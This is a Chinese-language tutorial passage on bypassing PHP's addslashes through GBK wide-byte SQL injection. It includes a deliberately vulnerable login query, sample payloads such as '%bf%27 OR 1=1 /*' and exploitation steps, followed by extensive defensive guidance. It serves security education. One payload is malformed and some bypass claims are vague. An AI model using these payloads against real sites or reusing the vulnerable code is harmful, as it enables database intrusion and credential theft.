// 漏洞代码示例
$username = $_POST['username'];
$password = $_POST['password'];

// 使用addslashes转义
$username = addslashes($username);
$password = addslashes($password);

// 构造SQL查询
$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
$result = mysql_query($query);
```

### 2.2 宽字节注入（GBK编码问题）
#### 原因：
- 在GBK等多字节字符集中，一个汉字由两个字节组成
- 第一个字节ASCII值大于127时，会被认为是汉字的第一个字节
- 可以利用这个特性绕过addslashes

#### 示例：
```php
// 在GBK编码下
// %bf%27会被解释为一个汉字，%27（单引号）未被转义
// 攻击载荷: %bf%27 OR 1=1 /*
// addslashes后: %bf%5c%27 OR 1=1 /*
// 在GBK解码时: %bf%5c被解释为一个汉字，%27仍然是单引号
```

## 3. addslashes漏洞利用技术

### 3.1 宽字节注入利用

#### 3.1.1 利用原理
在多字节字符集环境下，通过构造特殊的字节序列绕过addslashes转义：

```php
// 攻击示例
// 原始输入: %bf%27 OR 1=1 /*
// addslashes处理后: %bf%5c%27 OR 1=1 /*
// GBK解码后: 汉字\' OR 1=1 /*
// 单引号仍然存在，可以闭合SQL语句
```

#### 3.1.2 常用载荷
```php
// GBK编码下的绕过载荷
%bf%27 OR 1=1 /*
%aa%5c UNION SELECT ...
%s1%27 AND (SELECT 1) /*
```

### 3.2 字符集检测绕过

#### 3.2.1 利用条件
1. 数据库使用多字节字符集（如GBK, BIG5）
2. PHP使用addslashes函数进行转义
3. 没有设置正确的字符集

#### 3.2.2 利用步骤
1. 检测目标使用的字符集
2. 构造相应的宽字节注入载荷
3. 绕过addslashes转义

### 3.3 反斜杠处理不当

#### 3.3.1 问题场景
```php
// 错误的使用方式
$input = $_POST['input'];
$escaped = addslashes($input);
// 如果后续处理中再次处理反斜杠，可能导致问题
$query = "SELECT * FROM table WHERE data='$escaped'";
// 如果$escaped中包含\\，可能被错误处理
```

## 4. 高级利用技术

### 4.1 多层转义绕过
当存在多层addslashes调用时：

```php
// 第一层转义
$input = addslashes($_POST['input']); // ' -> \'

// 第二层转义
$input = addslashes($input); // \' -> \\'

// 如果处理不当，可能导致绕过
```

### 4.2 编码转换绕过
利用不同编码间的转换特性：

```php
// URL编码绕过
%27 -> ' (URL解码)
// addslashes -> \%27
// 在某些情况下可能绕过
```

## 5. 防护措施

### 5.1 使用预处理语句（推荐）
```php
// 使用PDO预处理语句
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$username, $password]);

// 使用mysqli预处理语句
$stmt = $mysqli->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->bind_param("ss", $username, $password);
$stmt->execute();
```

### 5.2 设置正确的字符集
```php
// 设置正确的字符集
mysql_query("SET NAMES 'utf8'");
// 或者
mysqli_set_charset($connection, "utf8");
```

### 5.3 使用更安全的转义函数
```php
// 使用mysql_real_escape_string（在使用mysql扩展时）
$escaped = mysql_real_escape_string($input);

// 使用PDO::quote
$escaped = $pdo->quote($input);
```

### 5.4 输入验证和过滤
```php
// 白名单验证
if (!preg_match("/^[a-zA-Z0-9_]+$/", $username)) {
    die("Invalid username");
}

// 长度限制
if (strlen($input) > 50) {
    die("Input too long");
}
```

## 6. 实际漏洞案例

### 6.1 历史案例
1. **Discuz!论坛系统**：早期版本存在宽字节注入漏洞
2. **PHPWind**：由于字符集处理不当导致的注入漏洞

### 6.2 漏洞发现方法
1. 代码审计，查找addslashes使用场景
2. 字符集检测
3. 注入测试（使用宽字节载荷）

## 7. 调试和分析技巧

### 7.1 字符集检测
```php
// 检测当前字符集
echo mysqli_character_set_name($connection);

// 检测PHP内部编码
echo mb_internal_encoding();
```

### 7.2 调试转义过程
```php
// 调试addslashes效果
$original = $_POST['input'];
$escaped = addslashes($original);
echo "Original: " . bin2hex($original) . "\n";
echo "Escaped: " . bin2hex($escaped) . "\n";
```

## 8. 现代防护建议

### 8.1 避免使用addslashes
- addslashes已被标记为不推荐使用
- 应该使用预处理语句或更安全的转义函数

### 8.2 统一字符集
- 数据库、PHP、HTML页面使用统一的字符集（推荐UTF-8）
- 避免多字节字符集带来的安全问题

### 8.3 安全开发规范
1. 使用参数化查询
2. 输入验证和过滤
3. 最小权限原则
4. 定期安全审计

## 9. 最佳实践总结

### 9.1 开发者注意事项
1. 避免使用addslashes函数
2. 使用预处理语句进行数据库操作
3. 设置正确的字符集
4. 实施输入验证和过滤

### 9.2 安全测试
1. 代码审计
2. 自动化扫描
3. 渗透测试
4. 字符集相关测试

通过深入理解addslashes漏洞的原理和利用方法，可以更好地进行安全防护和漏洞挖掘工作。在实际应用中，始终遵循安全编码规范是预防此类漏洞的最佳方法。现代PHP开发应该避免使用addslashes，而采用更安全的预处理语句技术。
        